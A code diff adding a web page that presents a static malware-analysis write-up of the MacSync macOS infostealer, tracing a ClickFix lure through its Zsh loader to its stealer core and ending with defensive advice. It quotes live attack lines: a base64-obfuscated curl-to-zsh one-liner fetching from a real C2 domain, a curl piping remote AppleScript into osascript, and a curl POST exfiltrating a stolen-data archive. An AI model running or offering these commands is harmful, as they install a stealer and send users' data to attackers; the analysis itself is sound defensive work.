@@ -1,0 +1,129 @@
+"use client";
+
+import WriteupTemplate from "@/components/WriteupTemplate";
+
+export default function MacSyncStealerWriteup() {
+  const writeupData = {
+    title: "MacSync Stealer: Static Malware Analysis",
+    author: "Kelvin Creighton",
+    tags: ["malware", "macos", "zsh", "static-analysis", "applescript"],
+    flag: "",
+    customLabel: "Malware Analysis — Write-Up",
+    sections: [
+      {
+        title: "Initial Discovery",
+        prose:
+          "In December 2025, a friend encountered a suspicious 'ClickFix' campaign. Intrigued, I decided to take a look. The lure was simple: a popup urging users to download an application by running a 'simple' command in their Terminal. To build trust, the campaign even included an embedded video of someone supposedly running the command on a VM.\n\nThe command provided was an obfuscated one-liner designed to bypass mental filters by appearing 'technical' and 'complicated':",
+        steps: [
+          {
+            number: "01",
+            label: "The Malicious One-Liner",
+            input: "curl -kfsSL $(echo 'aHR0cDovL2ZvbGRleG1vb24ud29ybGQvY3VybC9lYzdlNzRkM2E1MDY1NzZmZmFmNTAyMDg3Yjk1YzIzYzEzMWExYWRmMmU1ZDAwYjkwN2UwZDc3ZDIyYjQzN2Ey'|base64 -D)|zsh",
+            output: "[Executes Stage 1 Loader]",
+            reason:
+              "<strong>Reason:</strong> The command decodes a Base64 string to reveal the hidden C2 URL (`http://foldexmoon.world/curl/...`), downloads the payload silently using `curl`, and immediately pipes it into `zsh` for execution. Obfuscating the URL prevents users from easily checking it in a browser, where security filters might trigger a warning.",
+          },
+          {
+            number: "02",
+            label: "C2 Header Analysis",
+            input: "curl -I --max-time 5 http://foldexmoon.world/curl/ec7e74d3a506576ffaf502087b95c23c131a1adf2e5d00b907e0d77d22b437a2",
+            output: "HTTP/1.1 200 OK\nContent-Type: application/octet-stream\nContent-Length: 834\nServer: cloudflare\nContent-Disposition: attachment; filename=\"ec7e74d3a506576ffaf502087b95c23c131a1adf2e5d00b907e0d77d22b437a2.daily\"",
+            reason:
+              "<strong>Reason:</strong> The server delivers an 834-byte binary stream with a `.daily` extension. The use of Cloudflare and a non-standard extension is a common obfuscation tactic for Malware-as-a-Service (MaaS) distribution.",
+          },
+        ],
+      },
+      {
+        title: "Stage 1: The Zsh Loader",
+        prose:
+          "The downloaded file revealed itself to be a Zsh script. Its sole purpose is to decode and execute a second-stage payload entirely in memory, a technique known as 'fileless' execution which helps evade traditional antivirus scans that look for malicious files on disk.",
+        steps: [
+          {
+            number: "01",
+            label: "Deobfuscating the Stager",
+            input: "cat ec7e74d3a506576ffaf502087b95c23c131a1adf2e5d00b907e0d77d22b437a2.daily",
+            output: "#!/bin/zsh\nd25941=$(base64 -D <<'PAYLOAD_m14659633818266' | gunzip\nH4sIAFAeM2kAA+VU0W7TMBR971dcsmrqJJI4cROvHWWbJsHQmIa0ISYBqhz7urXq2FHism7AvxO6...\nPAYLOAD_m14659633818266\n)\neval \"$d25941\"",
+            reason:
+              "<strong>Reason:</strong> The script uses `base64 -D` (a macOS-specific flag) and `gunzip` to unpack the hidden payload. The `eval` command then executes the result immediately.",
+          },
+          {
+            number: "02",
+            label: "Extracting Stage 2",
+            input: "echo \"[BASE64_DATA]\" | base64 -D | gunzip > stage2.sh",
+            output: "[A 1.3KB Zsh Script]",
+            reason:
+              "<strong>Reason:</strong> By manually decoding the payload, we reveal the core logic of the MacSync Stealer before it can execute and hide itself.",
+          },
+        ],
+      },
+      {
+        title: "Stage 2: The Stealer Core",
+        prose:
+          "The second stage is a sophisticated Zsh-based stealer that acts as a background daemon. It is designed to be persistent, stealthy, and highly dynamic by fetching AppleScript payloads directly from the C2 server.",
+        steps: [
+          {
+            number: "01",
+            label: "Stealth Mechanisms",
+            input: "head -n 10 stage2.sh",
+            output: "daemon_function() {\n    exec </dev/null\n    exec >/dev/null\n    exec 2>/dev/null\n    local domain=\"foldexmoon.world\"",
+            reason:
+              "<strong>Reason:</strong> The script redirects all standard streams to `/dev/null`, ensuring no output is visible in the user's Terminal. It then defines its Command & Control (C2) infrastructure.",
+          },
+          {
+            number: "02",
+            label: "Dynamic AppleScript Execution",
+            input: "grep 'osascript' stage2.sh",
+            output: "curl -k -s ... \"http://$domain/dynamic?txd=$token\" | osascript",
+            reason:
+              "<strong>Reason:</strong> This is a critical discovery. The malware downloads dynamic AppleScript code and pipes it into `osascript`. This allows the attacker to push new stealing logic (Keychain access, browser data harvesting, etc.) without updating the main script.",
+          },
+          {
+            number: "03",
+            label: "Data Exfiltration (The 'Gate')",
+            input: "grep 'POST' stage2.sh",
+            output: "curl -k -X POST ... -F \"file=@/tmp/osalogging.zip\" ... \"http://$domain/gate\"",
+            reason:
+              "<strong>Reason:</strong> The malware bundles stolen data into `/tmp/osalogging.zip` and uploads it to the `/gate` endpoint. Research confirms that `osalogging.zip` is a known Indicator of Compromise (IoC) for the MacSync family.",
+          },
+        ],
+      },
+      {
+        title: "Context & Research",
+        prose:
+          "After my initial analysis in December 2025, further research confirmed this was MacSync Stealer (also known as Mac.c), a Malware-as-a-Service (MaaS) created by the threat actor 'Mentalpositive'.",
+        cards: [
+          {
+            title: "Evolution of MacSync",
+            items: [
+              "<strong>Origins:</strong> Emerged in April 2025 as a cheap, accessible infostealer for entry-level cybercriminals.",
+              "<strong>Social Engineering:</strong> Leverages the complexity of Terminal commands to bypass user suspicion. The use of `base64` encoding prevents link discovery through browser-based security filters.",
+              "<strong>Trust Building:</strong> Employs social proof, such as embedded videos of VMs supposedly running the command safely, to manipulate users into taking high-risk actions.",
+              "<strong>Distribution:</strong> Evolved from 'ClickFix' Terminal commands to highly sophisticated, Apple-notarized Swift applications to bypass Gatekeeper.",
+              "<strong>Infrastructure:</strong> Extensive use of the `.world` and `.shop` TLDs (e.g., `foldexmoon.world`) for C2 operations.",
+            ],
+          },
+        ],
+      },
+      {
+        title: "Key Takeaways",
+        cards: [
+          {
+            title: "Security Recommendations",
+            items: [
+              "Never copy and paste commands from untrusted websites into your Terminal, even if they appear to be from 'trusted' sources like GitHub or ChatGPT.",
+              "The use of `curl | sh` or `curl | osascript` is a high-risk pattern that should be treated with extreme suspicion.",
+              "Regularly audit your `/tmp` directory and background processes for unusual activity, particularly those redirecting all output to `/dev/null`.",
+            ],
+          },
+        ],
+      },
+    ],
+  };
+
+  return (
+    <WriteupTemplate
+      data={writeupData}
+      currentPath="/projects/cybersecurity/macsync-stealer"
+    />
+  );
+}
